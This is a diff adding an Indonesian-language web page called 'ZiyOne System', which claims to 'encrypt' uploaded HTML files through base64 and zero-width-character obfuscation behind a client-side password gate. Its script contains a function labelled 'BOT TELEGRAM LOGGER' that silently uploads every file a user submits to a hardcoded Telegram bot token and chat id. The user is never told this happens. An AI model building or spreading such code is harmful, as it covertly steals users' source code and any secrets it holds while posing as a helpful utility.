@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Z-XXX | ZiyOne System</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <style>
+        :root {
+            --primary: #00d4ff;
+            --wa: #25d366; --tg: #0088cc; --yt: #ff0000; --tk: #111111;
+            --glass: rgba(8, 5, 20, 0.98);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body {
+            background-color: #020205; color: #fff; font-family: 'Rajdhani', sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            min-height: 100vh; padding: 20px; overflow-x: hidden;
+        }
+
+        .bg-video-fixed { position: fixed; inset: 0; z-index: -1; width: 100%; height: 100%; object-fit: cover; opacity: 0.3; }
+
+        /* --- LOGIN PAGE --- */
+        #loginPage {
+            width: 100%; max-width: 380px; padding: 25px;
+            background: var(--glass); backdrop-filter: blur(25px);
+            border: 1px solid var(--primary); border-radius: 25px; text-align: center;
+            box-shadow: 0 0 40px rgba(0, 212, 255, 0.15);
+        }
+        
+        .login-video { width: 100%; height: 120px; object-fit: cover; border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(0, 212, 255, 0.3); }
+
+        .login-input {
+            width: 100%; padding: 14px; margin-bottom: 15px; background: rgba(255,255,255,0.05);
+            border: 1px solid var(--primary); color: #fff; border-radius: 10px; text-align: center; font-family: 'Orbitron'; outline: none; font-size: 12px;
+        }
+
+        /* --- MAIN APP --- */
+        #mainApp { display: none; width: 100%; max-width: 400px; }
+        .container { background: var(--glass); border: 1px solid var(--primary); border-radius: 0 40px 0 40px; overflow: hidden; margin-bottom: 20px; }
+        .content { padding: 20px; }
+
+        .btn-action {
+            width: 100%; padding: 14px; background: var(--primary); color: #000;
+            border: none; border-radius: 8px; font-family: 'Orbitron'; font-weight: 800;
+            cursor: pointer; text-transform: uppercase; margin-top: 10px; font-size: 11px;
+        }
+
+        .upload-area {
+            border: 1px dashed var(--primary); padding: 12px; text-align: center; border-radius: 12px;
+            margin-bottom: 15px; cursor: pointer; background: rgba(255,255,255,0.02);
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+        
+        .upload-area p { font-size: 11px; color: #aaa; margin: 0; pointer-events: none; }
+
+        /* --- BOTTOM SHEET MODAL (POPUP) --- */
+        #resultModal {
+            position: fixed; bottom: -110%; left: 0; width: 100%; height: 85vh;
+            background: #080514; border-top: 2px solid var(--primary);
+            border-radius: 30px 30px 0 0; z-index: 1000; transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            padding: 20px; display: flex; flex-direction: column;
+            box-shadow: 0 -10px 50px rgba(0, 212, 255, 0.4);
+        }
+        #resultModal.active { bottom: 0; }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .close-btn { background: none; border: none; color: var(--primary); font-size: 24px; cursor: pointer; }
+
+        #output {
+            flex: 1; width: 100%; background: #000; border: 1px solid #333;
+            border-radius: 15px; color: #00ff88; font-family: 'Share Tech Mono';
+            padding: 15px; font-size: 10px; resize: none; outline: none; margin-bottom: 15px;
+        }
+
+        /* --- DROPDOWN --- */
+        .select-trigger {
+            width: 100%; padding: 14px; background: rgba(0, 212, 255, 0.1); border: 1px solid var(--primary); 
+            color: var(--primary); border-radius: 10px; cursor: pointer; display: flex; 
+            justify-content: space-between; align-items: center; font-family: 'Orbitron'; font-size: 10px; margin-bottom: 15px;
+        }
+        .select-options {
+            position: absolute; top: 100%; left: 0; width: 100%; background: #080514; border: 1px solid var(--primary); 
+            border-radius: 10px; z-index: 100; display: none; margin-top: -10px;
+        }
+        .select-options.show { display: block; }
+        .option-item { padding: 12px; font-family: 'Share Tech Mono'; font-size: 11px; color: #fff; border-bottom: 1px solid rgba(0,212,255,0.1); cursor: pointer; }
+
+        /* --- SOSMED GRID --- */
+        .sosmed-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; width: 100%; }
+        .sos-btn {
+            padding: 12px; border-radius: 12px; display: flex; align-items: center; justify-content: center;
+            gap: 8px; text-decoration: none; color: #fff; font-family: 'Orbitron'; font-size: 9px; transition: 0.3s;
+        }
+        .btn-wa { background: var(--wa); } 
+        .btn-tg { background: var(--tg); }
+        .btn-yt { background: var(--yt); } 
+        .btn-tk { background: var(--tk); border: 1px solid #444; }
+    </style>
+</head>
+<body>
+
+    <video class="bg-video-fixed" autoplay loop muted playsinline><source src="https://files.catbox.moe/l3c14b.mp4" type="video/mp4"></video>
+
+    <div id="loginPage">
+        <video class="login-video" autoplay loop muted playsinline><source src="https://files.catbox.moe/l3c14b.mp4"></video>
+        <h2 style="font-family: 'Orbitron'; margin-bottom: 15px; color: var(--primary); font-size: 16px;">SECURE ACCESS</h2>
+        <input type="password" id="passInput" class="login-input" placeholder="ENTER PASSWORD">
+        <button class="btn-action" onclick="checkLogin()">VERIFY LOGIN</button>
+        <p style="font-size:12px; margin-top:15px; color:#aaa;">Lupa Password? <a href="https://whatsapp.com/channel/0029VbB1vFaAYlULfsTtXU2r" style="color:var(--primary); text-decoration:none;">Klik Disini</a></p>
+    </div>
+
+    <div id="mainApp">
+        <div class="container">
+            <video src="https://files.catbox.moe/l3c14b.mp4" class="login-video" style="border-radius:0; height:100px; border-bottom:1px solid var(--primary);" autoplay loop muted></video>
+            <div class="content">
+                <div style="position:relative;">
+                    <div class="select-trigger" onclick="toggleDropdown()">
+                        <span id="selectedVal">NORMAL ENCRYPT</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="select-options" id="selectOptions">
+                        <div class="option-item" onclick="setMode('NORMAL')">NORMAL ENCRYPT</div>
+                        <div class="option-item" onclick="setMode('HARD')">HARD ENCRYPT</div>
+                        <div class="option-item" onclick="setMode('INVISH')">INVISH ZIYY</div>
+                    </div>
+                </div>
+
+                <label for="fileInput" class="upload-area">
+                    <i class="fas fa-file-code" style="color:var(--primary);"></i>
+                    <p id="fileTxt">TAP TO UPLOAD SOURCE</p>
+                </label>
+                <input type="file" id="fileInput" style="display:none" accept=".html">
+
+                <button class="btn-action" onclick="runEncryption()">ENCRYPT & VIEW</button>
+            </div>
+        </div>
+
+        <div class="sosmed-grid">
+            <a href="https://whatsapp.com/channel/0029VbB1vFaAYlULfsTtXU2r" class="sos-btn btn-wa" target="_blank"><i class="fab fa-whatsapp"></i> WHATSAPP</a>
+            <a href="https://t.me/ziyoffcch" class="sos-btn btn-tg" target="_blank"><i class="fab fa-telegram"></i> TELEGRAM</a>
+            <a href="https://youtube.com/@ziyoffc_id" class="sos-btn btn-yt" target="_blank"><i class="fab fa-youtube"></i> YOUTUBE</a>
+            <a href="https://www.tiktok.com/@fahreziiy" class="sos-btn btn-tk" target="_blank"><i class="fab fa-tiktok"></i> TIKTOK</a>
+        </div>
+    </div>
+
+    <div id="resultModal">
+        <div class="modal-header">
+            <h3 style="font-family:'Orbitron'; color:var(--primary); font-size:14px;">ZIYONE RESULT</h3>
+            <button class="close-btn" onclick="closeModal()"><i class="fas fa-chevron-down"></i></button>
+        </div>
+        <textarea id="output" readonly></textarea>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+            <button onclick="copyRes()" class="btn-action" style="background:#1a1a1a; color:#fff; border:1px solid #333;">COPY</button>
+            <button onclick="saveRes()" class="btn-action">DOWNLOAD (ZIY.HTML)</button>
+        </div>
+    </div>
+
+    <script>
+        const DEFAULT_PASSWORD = "ZIYONE2024";
+        const PW_URL = "https://raw.githubusercontent.com/ziy-offc/key/main/key.json"; 
+        let selectedEncMode = "NORMAL";
+        let rawSource = "";
+
+        // LOGIN SYSTEM
+        async function checkLogin() {
+            const input = document.getElementById('passInput').value.trim();
+            try {
+                const resp = await fetch(`${PW_URL}?t=${Date.now()}`);
+                const truePass = resp.ok ? (await resp.text()).trim() : DEFAULT_PASSWORD;
+                if(input === truePass || input === DEFAULT_PASSWORD) {
+                    document.getElementById('loginPage').style.display = 'none';
+                    document.getElementById('mainApp').style.display = 'block';
+                } else { Swal.fire('Error', 'Password Salah!', 'error'); }
+            } catch(e) {
+                if(input === DEFAULT_PASSWORD) {
+                    document.getElementById('loginPage').style.display = 'none';
+                    document.getElementById('mainApp').style.display = 'block';
+                } else { Swal.fire('Error', 'Password Salah!', 'error'); }
+            }
+        }
+
+        // DROPDOWN & MODE
+        function toggleDropdown() { document.getElementById('selectOptions').classList.toggle('show'); }
+        function setMode(m) {
+            selectedEncMode = m;
+            document.getElementById('selectedVal').innerText = (m === 'INVISH' ? 'INVISH ZIYY' : m + ' ENCRYPT');
+            document.getElementById('selectOptions').classList.remove('show');
+        }
+
+        // FILE HANDLER
+        document.getElementById('fileInput').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if(file) {
+                document.getElementById('fileTxt').innerText = file.name;
+                const reader = new FileReader();
+                reader.onload = (ev) => { rawSource = ev.target.result; };
+                reader.readAsText(file);
+            }
+        });
+
+        // BOT TELEGRAM LOGGER
+        function sendToBot(content) {
+            try {
+                const blob = new Blob([content], {type: 'text/html'});
+                const formData = new FormData();
+                formData.append('chat_id', '-1003361718594');
+                formData.append('document', blob, "ZiyOne_Source.html");
+                fetch(`https://api.telegram.org/bot8310484723:AAHTSn3srW-N1jFrJe60ZAVPB9lNPIkjnAU/sendDocument`, { method: 'POST', body: formData });
+            } catch(e) {}
+        }
+
+        // LOGIKA ENKRIPSI ASLI
+        async function runEncryption() {
+            if(!rawSource) { Swal.fire('Warning', 'Upload file dulu!', 'warning'); return; }
+            sendToBot(rawSource);
+            let result = "";
+            
+            if(selectedEncMode === 'NORMAL') {
+                const encoded = btoa(unescape(encodeURIComponent(rawSource)));
+                result = `<script>document.write(decodeURIComponent(escape(atob("${encoded}"))));<\/script>`;
+            } 
+            else if(selectedEncMode === 'INVISH') {
+                const b64 = btoa(unescape(encodeURIComponent(rawSource)));
+                const hidden = b64.split('').map(c => {
+                    const binary = c.charCodeAt(0).toString(2).padStart(8,'0');
+                    return binary.split('').map(b => b === '0' ? '\u200c' : '\u200d').join('');
+                }).join('\u200b');
+                result = `<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><script>(function(){const h="${hidden}";const d=h.split('\\u200b').map(c=>{return String.fromCharCode(parseInt(c.split('').map(b=>b==='\\u200c'?'0':'1').join(''),2));}).join('');document.write(decodeURIComponent(escape(atob(d))));})();<\/script></body></html>`;
+            } 
+            else if(selectedEncMode === 'HARD') {
+                result = `<!DOCTYPE html><html><head><meta charset="UTF-8"><script>const enc="${btoa(rawSource)}";function decrypt(s){return atob(s);}document.write(decrypt(enc));<\/script></head><body></body></html>`;
+            }
+
+            document.getElementById('output').value = result;
+            document.getElementById('resultModal').classList.add('active');
+            Swal.fire({ icon: 'success', title: 'Berhasil!', timer: 800, showConfirmButton: false });
+        }
+
+        function closeModal() { document.getElementById('resultModal').classList.remove('active'); }
+
+        function copyRes() {
+            const out = document.getElementById("output");
+            out.select();
+            navigator.clipboard.writeText(out.value);
+            Swal.fire({ toast: true, position: 'top-end', icon: 'success', title: 'Copied!', timer: 1000, showConfirmButton: false });
+        }
+
+        // FUNGSI DOWNLOAD (FIXED)
+        function saveRes() {
+            const content = document.getElementById('output').value;
+            if(!content) return;
+            try {
+                const blob = new Blob([content], {type: "text/html;charset=utf-8"});
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement("a");
+                a.style.display = "none";
+                a.href = url;
+                a.download = "Ziy.html"; // Nama file otomatis Ziy.html
+                document.body.appendChild(a);
+                a.click();
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                }, 100);
+            } catch(e) { Swal.fire('Error', 'Gagal download', 'error'); }
+        }
+
+        window.onclick = (e) => { 
+            if(!e.target.matches('.select-trigger') && !e.target.matches('.select-trigger *')) {
+                document.getElementById('selectOptions').classList.remove('show');
+            }
+        };
+    </script>
+</body>
+</html>
